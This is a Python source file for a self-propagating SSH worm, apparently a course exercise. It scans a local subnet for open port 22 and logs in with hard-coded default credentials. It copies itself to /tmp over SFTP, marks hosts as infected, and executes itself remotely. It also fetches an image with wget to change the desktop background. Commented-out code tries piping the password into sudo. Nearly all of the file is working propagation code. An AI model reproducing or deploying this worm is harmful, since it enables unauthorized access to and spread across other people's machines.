#!/usr/bin/env python
import socket
import os, re
import sys, time
import datetime
import paramiko

# Target SSH by default
target_port = 22

# New desktop background url + file name
image_url = "https://i.imgur.com/hbNtlcJ.jpg"
image_name = "hbNtlcJ.jpg"

# Username and password to test with SSH
remote_username = "cpsc"
remote_password = "cpsc"

# Handy variables
home_dir = "/home/cpsc/"
worm_name = "worm.py"

# Output formatting
offset = 4 * " "

# Place in remote system to mark it as infected
marker_file = "infected.txt"

# Specifies what ip to stop at 192.168.1.0-max_ip. Saves time in testing
max_ip = 10


hosts = ["192.168.1." + str(i) for i in range(0, max_ip)]


def get_local_ip():
	""" Gets current machine's ip, so we don't waste time scanning it """
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	try:
		sock.connect(('8.8.8.8', 1))
		local_ip = sock.getsockname()[0]
	except:
		local_ip = "127.0.0.1"
	finally:
		sock.close()

	return local_ip


def scan_port(host, port):
	""" Scans specified port for a specified host, returns 0 on success """
	exit_code = -1
	try:
		# Set up socket to connect to
		ssh_sock = socket.socket()
		ssh_sock.settimeout(20)
		# Attempt to connect
		port_status = ssh_sock.connect_ex((host, port))
		# port_status will be 0 if specified port is open
		if port_status == 0:
			exit_code = 0

	except Exception as e:
		print ("%s[!] Port %d closed or unavailable\n" % (offset, port))
		pass
	except KeyboardInterrupt as e:
		print ("%s[!] User stopped scanning host %s\n" % (offset, host))
		return -1
	finally:
		ssh_sock.close()
	return exit_code


def get_vulnerable_hosts(port):
	""" Returns a list of hosts with specified port open """
	print ("[+] Scanning for vulnerable hosts...\n")
	vulnerable_hosts = []
	current_machine = get_local_ip()

	for host in hosts:
		# Skip scanning the machine running the scipt
		if current_machine == host:
			continue
		print ("[+] Scanning %s" % (host))
		try:
			port_status = scan_port(host, port)
			if port_status == 0:
				print("%s[o] Port %d open!" % (offset, port))
				vulnerable_hosts.append(host)
		except Exception as e:
			print ("%s[!] Error scanning %s\n" %(offset, host))
			pass
		except KeyboardInterrupt as e:
			print ("%s[!] Stopped looking for hosts\n" % (offset))
			return vulnerable_hosts

	return vulnerable_hosts


def set_background(ssh):
	""" Downloads a new desktop background for remote system """
	
	ls_output = os.listdir(home_dir)
	
	if image_name not in ls_output:
		print ("%s[o] Adding background..." % (offset))
		os.system("wget https://i.imgur.com/hbNtlcJ.jpg -O " + home_dir + image_name)
	
	# Now set the backround	
	os.environ["DISPLAY"] = ":0"
	os.system("gsettings set org.gnome.desktop.background picture-uri file://" + home_dir + image_name)

	"""
	# Get the files in the user's home folder
	stdin, stdout, stderr = ssh.exec_command("ls " + home_dir)

	# readlines() convert output to unicode, so convert back to ascii
	ls_output = stdout.readlines()
	ls_output = [str(name) for name in ls_output]
	ls_output = [name[0:-1] for name in ls_output]
	# Check if the image name did not appear in ls output
	if image_name not in ls_output:
		print ("%s[o] Adding background..." % (offset))
		# Download image to remote user's home directory
		ssh.exec_command("cd " + home_dir)
		ssh.exec_command("wget " + image_url)
	else:
		print ("%s[!] Background already there." % (offset))
	
	# Now try setting the background
	try:
		print (" Trying to set desktop background")
		
	




		#stdin, stdout, stderr = ssh.exec_command("export DISPLAY=:0")			
		# No output from these
		#print (stdout.readlines())
		#print (stderr.readlines())
		# Following command works when run manually on target machine, but not through ssh
		#print ("tying for pid")	
		#stdin,stdout,stderr = ssh.exec_command("echo pid=$(pgrep gnome-session)")
		#print (stdout.readlines())
		#print (stdout.readlines())
		#print (stdout.readlines())	
		#print (sys.__stdout_)
		#pid = stdout.readlines()[0][4:8]
		print ("pid is: " + pid)

		#sudo_prefix = "echo 'cpsc\n' + | sudo -S "
		#stdin,stdout,stderr = ssh.exec_command("export DBUS_SESSION_BUS_ADDRESS=$(grep -z DBUS_SESSION_BUS_ADDRESS /proc/" + pid + "/environ | cut -d= -f2-) && " + sudo_prefix + "gsettings set org.gnome.desktop.background picture-uri \"file://" + home_dir + image_name + "\"")
		#chan = ssh.invoke_shell()
		#command_list = ["\nexport pid=$(pgrep gnome-session)", "\nexport DBUS_SESSION_ADDRESS=$(grep -z DBUS_SESSION_BUS_ADDRESS /proc/$" + pid + "/environ | cut -d= -f2-)", sudo_prefix + "gsettings set org.gnome.desktop.background picturerui \"file://" + home_dir + image_name  "\""]
		#ssh.invoke_shell()
		#for command in command_list:
		#	chan.send(command)

		#stdin,stdout,stderr = ssh.exec_command(
		#sudo_prefix + "gsettings set org.gnome.desktop.background picture-uri \"file://" + home_dir + image_name + "\"")
		#print ("gsettings...")
		#print (stdout.readlines())
		#print (stderr.readlines())


		#prefix = "echo '" + remote_password + "' | sudo -S "
		#cmd = "gsettings set org.gnome.desktop.background picture-uri file:///$PWD/" + image_name
		#stdin, stdout, sterr = ssh.exec_command(prefix + cmd)
		# No output from these either
		# print (stdout.readlines())
		# print (stderr.readlines())
		#time.sleep(14)
	except:
		print("Error with setting gnome desktop background\n")
	"""

if __name__ == "__main__":
	""" Main program that performs the scan """
	
	vulnerable_hosts = get_vulnerable_hosts(target_port)
	print ("\n[Scan Results]")
	print ("Vulnerable hosts: %s, \n" % (vulnerable_hosts))

	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	local_ip = get_local_ip()
	for host in sorted(vulnerable_hosts):
		print ("[+] Attempting to SSH into %s" % (host))

		# Attempt to SSH into known host
		try:
			ssh.connect(host, username=remote_username, password=remote_password)
		except Exception as e:
			print ("%s[!] Bad credentials, skipping." % (offset))
			ssh.close()
			continue
		except KeyboardInterrupt as e:
			print ("%s[!] Skipping host\n" % (offset))
			ssh.close()
			continue
		
		# Try to put worm on remote system
		try:
			sftpClient = ssh.open_sftp()
			print ("%s[o] Access Granted!" % (offset))
			
			# Check if the system has already been infected
			stdin, stdout, stderr = ssh.exec_command("ls /tmp/")
			# Convert stdout to ASCII from unicode
			results = stdout.readlines()
			results = [str(name) for name in results]
			results = [name[0:-1] for name in results]
			if marker_file in results:
				print ("%s[!] System already infected, skipping." % (offset))
				# Create log file to see which system infected it, remove this later
				cur_time = str(datetime.datetime.now()).replace(' ','-')
				ssh.exec_command("echo '" + str(local_ip) + "' >> " + home_dir + "loginf-" + cur_time)
				set_background(ssh)
				ssh.close()
				continue
			else: # Has not been infected
				print ("%s[o] Marking system..." % (offset))
				sftpClient.put(worm_name, "/tmp/" + worm_name)
				ssh.exec_command("echo " + local_ip + " >> /tmp/" + marker_file)
					
		except Exception as e:
			print ("%s[!] Error opening sftp connection. Skipping host " % (offset))
			ssh.close()
			continue
		# Try making worm file executable by all
		try:
			ssh.exec_command("chmod a+x /tmp" + worm_name)
		except Exception as e: 
			print ("%s [!]Error with chmod. Skipping host", (offset))
			ssh.close()
			continue
		# Try launching the worm from remote host
		try:
			ssh.exec_command("python /tmp/" + worm_name)
			print ("%s[o] Executing worm from %s" % (offset, host))
		except Exception as e:
			print("%s[!] Error executing" % (offset))
			ssh.close()
			continue

		except KeyboardInterrupt as e:
			print ("%s[!] User stopped, moving to next IP\n" % (offset))
			ssh.close()
			continue

		# Try changing the background on remote host
		try:
			set_background(ssh)
		except Exception as e:
			print ("%s[!] Error setting desktop background\n" % (offset))
			pass
		
		except KeyboardInterrupt as e:
			print ("%s[!] User stopped, quitting.\n" % (offset))
			ssh.close()
			sys.exit(1)
		

		ssh.close()

	print ("Finished attacking\n")

